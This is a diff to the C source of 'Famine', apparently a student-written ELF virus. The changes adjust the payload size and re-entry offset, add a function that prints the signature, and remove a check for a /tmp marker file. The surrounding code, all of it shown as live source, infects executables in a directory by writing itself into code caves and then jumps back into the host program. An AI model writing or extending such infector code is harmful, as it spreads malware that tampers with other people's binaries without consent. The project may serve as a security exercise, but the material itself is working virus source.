@@ -8,7 +8,8 @@
 #include <sys/mman.h>
 #include <sys/syscall.h>
 
-#define BUILDER_SIZE 0x139;
+#define BUILDER_SIZE 0x13c;
+#define BUILDER_RE_ENTRY_OFFSET 0xe2;
 __attribute__((section(".text"))) volatile static char signatur[] = "Famine | abied-ch & fbruggem";
 __attribute__((section(".text"))) volatile static uint8_t infected = 0;
 // Structs
@@ -78,6 +79,13 @@ __attribute__((always_inline)) inline void ft_strncpy(volatile char *src, volati
 __attribute__((always_inline)) inline int ft_strstr(volatile char *haystack, volatile char *needle, size_t size);
 __attribute__((always_inline)) inline void ft_memcpy(volatile void *src, volatile void *dst, uint64_t size);
 
+__attribute__((always_inline)) inline void
+heyyy() {
+
+    ft_write(1, signatur, ft_strlen(signatur));
+    char nl = '\n';
+    ft_write(1, &nl, 1);
+}
 #ifdef TESTING
 int
 main(void) {
@@ -85,29 +93,8 @@ main(void) {
 void
 _start() {
 #endif
-    // __attribute__((section(".text"))) volatile static char infect_test[] = {'/', 't', 'm', 'p', '/', 'i', 'n', 'f', 'e', 'c', 't', 'e', 'd', '\0'};
-    volatile char infect_test[15];
-    infect_test[0] = '/';
-    infect_test[1] = 't';
-    infect_test[2] = 'm';
-    infect_test[3] = 'p';
-    infect_test[4] = '/';
-    infect_test[5] = 'i';
-    infect_test[6] = 'n';
-    infect_test[7] = 'f';
-    infect_test[8] = 'e';
-    infect_test[9] = 'c';
-    infect_test[10] = 't';
-    infect_test[11] = 'e';
-    infect_test[12] = 'd';
-    infect_test[13] = '\0';
-    ft_write(1, infect_test, ft_strlen(infect_test));
-    int fd_in = ft_open(infect_test, O_RDONLY, 0);
-    if (fd_in < 0) infected = 1;
-
     volatile static char path_self[16];
 
-    // Then in initialization:
     path_self[0] = '/';
     path_self[1] = 'p';
     path_self[2] = 'r';
@@ -150,7 +137,7 @@ _start() {
     if (infect_dir(dir0, &file_self)) ft_exit(1);
 
     Elf64_Ehdr *header = file_self.mem;
-    uint64_t jump_to = header->e_entry + 0xdf;
+    uint64_t jump_to = header->e_entry + BUILDER_RE_ENTRY_OFFSET;
     __asm__ volatile("jmp *%0" : : "r"(jump_to));
 }
 // 0x4ef1d0
@@ -233,7 +220,6 @@ infect_file(volatile char *path, volatile file *file_self) {
     // ft_write(1, &nl, 1);
     // print_number(entries_self[0].size);
     // ft_write(1, &nl, 1);
-
     uint64_t provided_space = code_caves_size_sum(code_caves_target, code_caves_target_num);
     uint64_t needed_space_table = code_caves_target_num * 16;
     uint64_t needed_space = entries_size_sum(entries_self, entries_self_num) + needed_space_table;
